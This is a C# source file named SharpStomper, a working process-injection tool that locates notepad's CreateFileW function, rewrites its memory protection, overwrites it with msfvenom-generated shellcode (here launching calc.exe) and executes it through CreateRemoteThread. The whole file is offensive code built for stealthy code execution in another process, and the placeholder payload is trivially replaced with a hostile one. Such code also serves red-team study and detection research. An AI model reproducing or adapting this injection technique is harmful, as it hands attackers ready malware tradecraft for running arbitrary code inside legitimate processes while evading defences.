using System;
using System.Text;
using System.Runtime.InteropServices;
using System.Diagnostics;

namespace SharpStomper
{
    public static class Program
    {
        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        internal static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
        [DllImport("psapi.dll", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
        public static extern int EnumProcessModules(IntPtr hProcess, [Out] IntPtr lphModule, uint cb, out uint lpcbNeeded);
        [DllImport("psapi.dll", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode)]
        static extern uint GetModuleFileNameEx(IntPtr hProcess, IntPtr hModule, [Out] StringBuilder lpBaseName, uint nSize);
        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, int dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        public static void Main(string[] args)
        {
          //msfvenom -p windows/x64/exec CMD=calc.exe -b "x00" -f csharp
            byte[] buf = new byte[319] {
                0x48,0x31,0xc9,0x48,0x81,0xe9,0xdd,0xff,0xff,0xff,0x48,0x8d,0x05,0xef,0xff,
                0xff,0xff,0x48,0xbb,0xc6,0xbc,0x28,0x36,0x16,0xba,0x24,0xaf,0x48,0x31,0x58,
                0x27,0x48,0x2d,0xf8,0xff,0xff,0xff,0xe2,0xf4,0x3a,0xf4,0xab,0xd2,0xe6,0x52,
                0xe4,0xaf,0xc6,0xbc,0x69,0x67,0x57,0xea,0x76,0xfe,0x90,0xf4,0x19,0xe4,0x73,
                0xf2,0xaf,0xfd,0xa6,0xf4,0xa3,0x64,0x0e,0xf2,0xaf,0xfd,0xe6,0xf4,0xa3,0x44,
                0x46,0xf2,0x2b,0x18,0x8c,0xf6,0x65,0x07,0xdf,0xf2,0x15,0x6f,0x6a,0x80,0x49,
                0x4a,0x14,0x96,0x04,0xee,0x07,0x75,0x25,0x77,0x17,0x7b,0xc6,0x42,0x94,0xfd,
                0x79,0x7e,0x9d,0xe8,0x04,0x24,0x84,0x80,0x60,0x37,0xc6,0x31,0xa4,0x27,0xc6,
                0xbc,0x28,0x7e,0x93,0x7a,0x50,0xc8,0x8e,0xbd,0xf8,0x66,0x9d,0xf2,0x3c,0xeb,
                0x4d,0xfc,0x08,0x7f,0x17,0x6a,0xc7,0xf9,0x8e,0x43,0xe1,0x77,0x9d,0x8e,0xac,
                0xe7,0xc7,0x6a,0x65,0x07,0xdf,0xf2,0x15,0x6f,0x6a,0xfd,0xe9,0xff,0x1b,0xfb,
                0x25,0x6e,0xfe,0x5c,0x5d,0xc7,0x5a,0xb9,0x68,0x8b,0xce,0xf9,0x11,0xe7,0x63,
                0x62,0x7c,0xeb,0x4d,0xfc,0x0c,0x7f,0x17,0x6a,0x42,0xee,0x4d,0xb0,0x60,0x72,
                0x9d,0xfa,0x38,0xe6,0xc7,0x6c,0x69,0xbd,0x12,0x32,0x6c,0xae,0x16,0xfd,0x70,
                0x77,0x4e,0xe4,0x7d,0xf5,0x87,0xe4,0x69,0x6f,0x57,0xe0,0x6c,0x2c,0x2a,0x9c,
                0x69,0x64,0xe9,0x5a,0x7c,0xee,0x9f,0xe6,0x60,0xbd,0x04,0x53,0x73,0x50,0x39,
                0x43,0x75,0x7e,0xac,0xbb,0x24,0xaf,0xc6,0xbc,0x28,0x36,0x16,0xf2,0xa9,0x22,
                0xc7,0xbd,0x28,0x36,0x57,0x00,0x15,0x24,0xa9,0x3b,0xd7,0xe3,0xad,0x4a,0x91,
                0x0d,0x90,0xfd,0x92,0x90,0x83,0x07,0xb9,0x50,0x13,0xf4,0xab,0xf2,0x3e,0x86,
                0x22,0xd3,0xcc,0x3c,0xd3,0xd6,0x63,0xbf,0x9f,0xe8,0xd5,0xce,0x47,0x5c,0x16,
                0xe3,0x65,0x26,0x1c,0x43,0xfd,0x55,0x77,0xd6,0x47,0x81,0xa3,0xc4,0x4d,0x36,
                0x16,0xba,0x24,0xaf };

            Process[]  localByName = Process.GetProcessesByName("notepad");
            int procID = localByName[0].Id;


            IntPtr hProcess = OpenProcess(0x001F0FFF, false, procID);
            IntPtr functionHandler = GetFunc("KERNEL32.DLL", "CreateFileW", "notepad");
            Console.WriteLine(functionHandler);
            uint oldperms;
            VirtualProtectEx(hProcess, functionHandler, buf.Length, 0x40, out oldperms);
            VirtualProtectEx(hProcess, functionHandler, buf.Length, 0x80, out oldperms);
            IntPtr lno;
            WriteProcessMemory(localByName[0].Handle, functionHandler, buf, buf.Length, out lno);
            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, functionHandler, IntPtr.Zero, 0, IntPtr.Zero);
            
        }
        public static IntPtr GetFunc(string dll, string func, string pname)
        {
            Process[] pc = Process.GetProcessesByName(pname);
            IntPtr procName = IntPtr.Zero;
            foreach (Process p in pc)
            {
                IntPtr[] hMods = new IntPtr[1024];
                GCHandle gch = GCHandle.Alloc(hMods, GCHandleType.Pinned);
                IntPtr pModules = gch.AddrOfPinnedObject();
                // Setting up the rest of the parameters for EnumProcessModules
                uint uiSize = (uint)(Marshal.SizeOf(typeof(IntPtr)) * (hMods.Length));
                uint cbNeeded = 0;
                if (EnumProcessModules(p.Handle, pModules, uiSize, out cbNeeded) == 1)
                {
                    Int32 uiTotalNumberofModules = (Int32)(cbNeeded / (Marshal.SizeOf(typeof(IntPtr))));
                    for (int i = 0; i < (int)uiTotalNumberofModules; i++)
                    {
                        StringBuilder strbld = new StringBuilder(1024);
                        GetModuleFileNameEx(p.Handle, hMods[i], strbld, (uint)(strbld.Capacity));
                        if (strbld.ToString().EndsWith(dll))
                        {

                            IntPtr test = GetProcAddress(hMods[i], "CreateFileW");
                            gch.Free();
                            return test;
                        }
                    }
                }
                gch.Free();
            }
            return procName;
        }
    }
}
